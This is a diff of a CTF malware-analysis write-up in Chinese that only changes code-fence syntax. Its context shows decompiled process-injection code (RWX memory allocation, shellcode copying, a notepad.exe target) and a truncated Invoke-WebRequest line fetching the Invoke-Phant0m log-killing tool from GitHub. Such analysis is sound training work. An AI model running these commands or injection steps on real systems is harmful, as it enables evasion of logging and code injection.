@@ -11,7 +11,7 @@ lang: zh_TW
 ## Reverse Engineering - Another Injection
 這題是用Golang寫的
 ![image](https://hackmd.io/_uploads/BkIRpkIZWe.png)
-```cpp=
+```cpp
 // main.main
 void __fastcall main_main()
 {
@@ -48,7 +48,7 @@ PS C:\Users\user\CTF\BTLO\6f581df0caadc199d2e99fff84b0534ec52ae272\sample> go to
 
 ### Q3: What is the dependency package the sample uses for invoking windows APIs 
 大部分都是用Go語言內的syscall，但是看到`main_getpid`:
-```cpp=
+```cpp
 // main.getpid
 int main_getpid()
 {
@@ -124,7 +124,7 @@ int main_getpid()
 在`main_getpid()`的地方，回傳notepad.exe的位址
 
 再看到main_inject():
-```cpp=
+```cpp
 // main.inject
 void __golang main_inject(uintptr a1, uintptr a2, __int64 a3, unsigned int a4)
 {
@@ -207,7 +207,7 @@ Invoke-WebRequest "https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/master
 
 ## Injection Series Part 3
 先逆一下`main()`:
-```cpp=
+```cpp
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   int v3; // eax
@@ -248,7 +248,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 
 ### Q2: Again, what is the size of the shellcode? 😉
 從第25行開始看:
-```cpp=
+```cpp
 EventW = CreateEventW(0, 0, 1, 0);    //建一個event
 v5 = VirtualAlloc(0, 0x120u, 0x1000u, 0x40u);    //配置一塊記憶體
 memmove(v5, &unk_403018, 0x120u);    //把&unk_403018寫進去
@@ -301,7 +301,7 @@ Q6: What is the API used to create a wait object?
 ## Injection Series Part 4
 先逆一下`main()`的地方:
 
-```cpp=
+```cpp
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   //省略型態宣告...
